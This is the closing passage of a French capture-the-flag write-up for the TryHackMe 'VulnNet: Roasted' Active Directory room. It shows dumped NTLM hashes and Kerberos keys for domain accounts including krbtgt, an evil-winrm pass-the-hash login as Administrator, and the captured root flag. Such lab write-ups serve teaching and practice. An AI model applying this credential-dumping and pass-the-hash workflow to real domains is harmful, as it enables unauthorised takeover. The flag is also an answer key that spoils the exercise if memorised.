vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
WIN-2BO8M1OE1M1$:des-cbc-md5:1f579149bc9252e6
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

Nous avons le hash NT de l'administrateur:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
```

#### evil-winrm

On peut maintenant se connecter à la machine avec Evil-WinRM:

```bash
[May 12, 2024 - 12:32:52 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'


Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Content "C:/Users/Administrator/Desktop/system.txt"
THM{16f45e3934293a57645f8d7bf71d8d4c}
*Evil-WinRM* PS C:\Users\Administrator\Documents> exit

Info: Exiting with code 0
```

On a récupéré le flag root **THM{16f45e3934293a57645f8d7bf71d8d4c}**.

Voilà, c'est terminé pour cette room. J'espère que vous avez apprécié. Si vous avez des questions ou des suggestions n'hésitez pas à me contacter sur [linkedin](https://www.linkedin.com/in/lukas-taboga-5a8040237/).